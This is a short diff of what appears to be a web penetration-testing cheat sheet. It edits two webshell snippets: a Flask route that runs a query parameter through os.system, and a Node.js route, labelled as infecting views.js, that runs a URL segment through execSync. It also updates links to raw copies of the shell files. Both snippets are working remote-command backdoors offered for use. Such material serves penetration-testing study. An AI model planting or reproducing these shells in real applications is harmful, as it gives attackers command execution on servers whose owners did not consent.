@@ -809,14 +809,14 @@ from flask import Flask,request,os
 
 app = Flask(__name__)
    
-@app.route('/shell')
+@app.route('/okay')
 def cmd():
-    return os.system(request.args.get('ok'))
+    return os.system(request.args.get('c'))
 
 if __name__ == "__main__":
 	app.run()
 ```
-https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/codes/webshells/wshell.py
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.py
 	
 ### Webshell infecting views.js -> nodejs
 ```
@@ -831,11 +831,11 @@ function Exec(command){
 	const stdout = execSync(command);
 	return "Result: "+stdout
 }
-app.get('/ok/:command', (req, res) => 
+app.get('/okay/:command', (req, res) => 
 res.send(Exec(req.params.command))
 );
 ```
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/wshell.js
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.js
 
 ### SQL Injection Out-Of-Band, etc
 
